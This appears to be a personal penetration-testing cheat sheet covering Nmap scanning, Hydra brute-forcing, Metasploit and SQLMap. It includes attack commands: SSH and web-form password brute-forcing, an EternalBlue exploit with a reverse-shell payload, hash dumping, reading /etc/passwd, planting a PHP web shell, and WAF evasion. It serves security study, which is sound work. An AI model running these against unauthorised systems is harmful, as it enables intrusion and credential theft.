# 🔍 Nmap

## 📦 Basic Scanning
| Command                      | Description                                |
|-----------------------------|--------------------------------------------|
| `nmap <ip_addr>`             | Default scan (top 1000 TCP ports)          |
| `nmap -p <port>`            | Scan specific port                         |
| `nmap -p 1-65535` or `-p-`  | Scan all 65535 TCP ports                   |
| `nmap <IP1,IP2,...>`        | Scan multiple IPs                          

## 🚀 Scan Types
| Command         | Description                        |
|----------------|------------------------------------|
| `-sS`           | TCP SYN scan (stealthy, default as root) |
| `-sT`           | TCP connect scan (default as non-root)  |
| `-sU`           | UDP scan                           |
| `-sV`           | Service version detection          |
| `-O`            | OS detection                       |
| `-A`            | Aggressive scan (`-sV`, `-O`, `--traceroute`) |
| `-sC`           | Run default scripts (like `--script=default`) |

## 🕓 Timing and Performance
| Command   | Description                    |
|----------|--------------------------------|
| `-T0`     | Paranoid (very slow, stealthy) |
| `-T3`     | Normal (default)               |
| `-T4`     | Aggressive (fast, common)      |
| `-T5`     | Insane (very fast, may miss data) |

## 🛡️ Host Discovery
| Command   | Description                                 |
|-----------|---------------------------------------------|
| `-Pn`      | Skip host discovery (assume host is up)     |
| `-sn`      | Ping scan (no port scan)                    |
| `-PS`      | TCP SYN Ping                                |
| `-PE`      | ICMP Echo Ping                              |

## 📄 Output Options
| Command     | Description                          |
|-------------|--------------------------------------|
| `-v`         | Verbose output                       |
| `-oN file`   | Normal output to file                |
| `-oX file`   | XML output to file                   |
| `-oG file`   | Grepable output to file              |
| `-oA prefix` | All formats (Normal, XML, Grepable)  |

## 🧠 Scripting Engine (NSE)
| Command                        | Description                            |
|--------------------------------|----------------------------------------|
| `--script=<script>`            | Run specific script                    |
| `--script=default`             | Run default scripts                    |
| `--script=vuln`                | Run common vulnerability scripts       |

## My Uses

```
nmap -sS -sV -T4 -p- -Pn <ip_addr> -vv
```
- **-sS**: TCP SYN scan
- **-sV**: Version detection
- **-T4**: iming template to level 4, which makes the scan faster, but still reasonably accurate
- **-p-**: scan all 65,535 TCP ports, not just the default top 1,000
- **-Pn**: skip host discovery — i.e., assume the host is up, even if it doesn’t respond to ping (ICMP) or other probes

Can be imported natively within section [MetasploitDB](#-metasploitdb)

```
db_nmap -sS -sV -T4 -p- -Pn <ip_addr>
```
Follow up with a vulners scan

```
db_nmap -sV --script vulners <ip_addr>
``` 


---
---
---
---
---
# 🔓 Hydra 

## 📦 Basic Syntax

```bash
hydra [options] -L users.txt -P passwords.txt <protocol>://<target>
```

## 📂 Wordlists

| Option     | Description                      |
|------------|----------------------------------|
| `-l user`  | Single username                  |
| `-L file`  | List of usernames                |
| `-p pass`  | Single password                  |
| `-P file`  | List of passwords                |

## 🌐 Supported Services (Protocols)

Common examples:

- `ftp`
- `ssh`
- `telnet`
- `http-get`
- `http-post`
- `http-form-get`
- `http-form-post`
- `smb`
- `rdp`
- `vnc`
- `mysql`
- `postgres`
- `smtp`
- `imap`

## ⚙️ Useful Options

| Option        | Description                                                 |
|---------------|-------------------------------------------------------------|
| `-s <port>`   | Specify custom port                                         |
| `-V`          | Verbose mode (show each attempt)                            |
| `-f`          | Exit after first valid login found                          |
| `-t <num>`    | Number of parallel tasks (default is 16)                    |
| `-o <file>`   | Output to file                                              |
| `-e nsr`      | Try `null` (n), `same as login` (s), `reversed login` (r)   |
| `-u`          | Loop users with each password instead of pairing            |

## 💡 HTTP Form


```
hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip_addr> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

- `^USER^` and `^PASS^` are placeholders for Hydra to substitute.
- `F=Login failed` is the failure condition string in the HTTP response.

## 💣 SSH Brute-force

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip_addr> -t 4 ssh -v
```
---
---
---
---
---

# 💥 Metasploit

## 📦 Starting Metasploit
```
msfconsole
```

## 🔍 Searching for Exploits
| Command                        | Description                                      |
|---------------------------------|--------------------------------------------------|
| `search <exploit_name>`         | Search for a specific exploit                   |
| `search type:<exploit_type>`    | Search by exploit type (e.g., `search type:exploit/windows`) |
| `search platform:<platform>`    | Search by platform (e.g., `search platform:linux`)  |
| `search name:<name>`            | Search for a specific name                      |

## 🧑‍💻 Selecting an Exploit
```bash
use <exploit_path>
```
- Example: `use exploit/windows/smb/ms17_010_eternalblue`

## ⚙️ Setting Payloads
| Command                       | Description                                 |
|-------------------------------|---------------------------------------------|
| `set PAYLOAD <payload>`        | Set a specific payload                     |
| `show payloads`                | List available payloads                    |
| `set LHOST <local_ip>`         | Set local IP for reverse shell             |
| `set LPORT <port>`             | Set local port for reverse shell           |
| `set RHOST <target_ip>`        | Set remote target IP                       |
| `show options`                 | Display required options for the exploit   |

## 💥 Launching an Exploit
```bash
exploit
```
- Runs the exploit and attempts to compromise the target.

## 🛠️ Post-Exploitation
| Command                       | Description                              |
|-------------------------------|------------------------------------------|
| `sessions`                     | List active sessions                     |
| `sessions -i <session_id>`     | Interact with a specific session         |
| `background`                   | Background current session               |
| `exit`                         | Exit from a session                      |
| `meterpreter`                  | Start a Meterpreter session              |

## 💡 Meterpreter Commands

| Command                     | Description                                 |
|-----------------------------|---------------------------------------------|
| `sysinfo`                   | Get system information                      |
| `getuid`                    | Get user ID (whoami equivalent)             |
| `ps`                        | List running processes                      |
| `kill <PID>`                | Kill a process by PID                       |
| `download <file_path>`      | Download a file from the target machine     |
| `upload <file_path>`        | Upload a file to the target machine         |
| `shell`                     | Get a command shell on the target machine   |
| `hashdump`                  | Dump password hashes from Windows SAM       |

## 🚪 Exploiting Windows SMB (EternalBlue)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <target_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
exploit
```

## 🚨 Auxiliary Scans
| Command                       | Description                                    |
|-------------------------------|------------------------------------------------|
| `use auxiliary/scanner/portscan/tcp` | TCP port scanner                            |
| `set RHOSTS <target_ip_range>`  | Set target range (e.g., 192.168.1.0/24)       |
| `run`                          | Run the auxiliary scanner                      |

## ⚡ Exploit Techniques
| Command                              | Description                                      |
|--------------------------------------|--------------------------------------------------|
| `use exploit/multi/handler`          | Setup a listener for a reverse shell (handler)   |
| `setg <global_option> <value>`       | Set global options for all modules (e.g., `setg LHOST <ip>`) |
| `run post/windows/gather/enum_logged_on_users` | Post-exploitation gather logged-on users       |

## 🔑 Credential Gathering
| Command                              | Description                                      |
|--------------------------------------|--------------------------------------------------|
| `use auxiliary/gather/enum_ssh`      | Enumerate SSH users and keys                     |
| `use auxiliary/gather/enum_vnc`      | Enumerate VNC users and configurations           |
| `use auxiliary/scanner/http/dir_scanner` | Directory scanner for web apps                 |

## 📈 MetasploitDB 
| Command                      | Description                                          |
|------------------------------|------------------------------------------------------|
| `db_nmap <target>`            | Run `nmap` scan and save the results to the database |
| `hosts`                       | List all discovered hosts                            |
| `services`                    | List all discovered services                         |
| `vulns`                       | List all discovered vulnerabilities                  |

## 🛑 Common Payloads
| Payload                                      | Description                          |
|----------------------------------------------|--------------------------------------|
| `windows/x64/meterpreter/reverse_tcp`       | Reverse TCP Meterpreter payload      |
| `linux/x64/shell_reverse_tcp`               | Reverse shell payload for Linux      |
| `php/meterpreter/reverse_tcp`               | Reverse TCP Meterpreter payload for PHP |
| `windows/x64/shell_reverse_tcp`             | Reverse shell for Windows            |

## 🗂️ Saving and Reusing Sessions
| Command                              | Description                               |
|--------------------------------------|-------------------------------------------|
| `save`                               | Save the current workspace                |
| `workspace -a <workspace_name>`      | Create a new workspace                    |
| `workspace <workspace_name>`         | Switch to a specific workspace            |

---
---
---
---
---



# 🐍 SQLMap 

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

## 📦 Basic Command Structure

```bash
sqlmap -u <URL> [OPTIONS]
```


## 🔎 Detection and Enumeration

### Basic Scan
```bash
sqlmap -u "http://example.com/page.php?id=1"
```

### Specify Request Method
```bash
sqlmap -u "http://example.com/page.php" --data="id=1"
```

### Crawl a Website (Spider)
```bash
sqlmap -u "http://example.com" --crawl=3
```

## 🧠 Enumeration Options

### Enumerate DBMS
```bash
sqlmap -u <URL> --dbms=mysql
```

### List Databases
```bash
sqlmap -u <URL> --dbs
```

### List Tables
```bash
sqlmap -u <URL> -D <database> --tables
```

### List Columns
```bash
sqlmap -u <URL> -D <database> -T <table> --columns
```

### Dump Table Data
```bash
sqlmap -u <URL> -D <database> -T <table> --dump
```

## 🧰 Authentication

### Cookie Injection
```bash
sqlmap -u <URL> --cookie="SESSIONID=abc123"
```

### Auth with Headers
```bash
sqlmap -u <URL> --headers="X-API-Key: xyz"
```

## 🎯 Targeted Testing

### Specific Parameter
```bash
sqlmap -u <URL> -p id
```

### Risk and Level
```bash
sqlmap -u <URL> --risk=3 --level=5
```

- `--risk`: affects the risk of tests (1-3)
- `--level`: affects number of tests (1-5)


## 🪓 Bypasses and Tampering

### Use Tamper Script
```bash
sqlmap -u <URL> --tamper=charencode
```

### Random User-Agent
```bash
sqlmap -u <URL> --random-agent
```

## 🧱 WAF Evasion

```bash
sqlmap -u <URL> --tamper=between,charencode
```

Use `--identify-waf` to detect WAF

## 💾 File Operations

### Read a File
```bash
sqlmap -u <URL> --file-read="/etc/passwd"
```

### Write a File
```bash
sqlmap -u <URL> --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

## 💉 Shell Access

### Get OS Shell
```bash
sqlmap -u <URL> --os-shell
```

### Get SQL Shell
```bash
sqlmap -u <URL> --sql-shell
```

## 📜 Useful Flags

| Flag             | Description                     |
|------------------|---------------------------------|
| `--batch`        | Non-interactive mode            |
| `--threads=N`    | Use multiple threads            |
| `--tor`          | Use Tor for anonymity           |
| `--proxy`        | Use a proxy (e.g. http://...)   |
| `--timeout=N`    | Set request timeout             |
| `--retries=N`    | Retry failed requests N times   |

---
---
---
---
---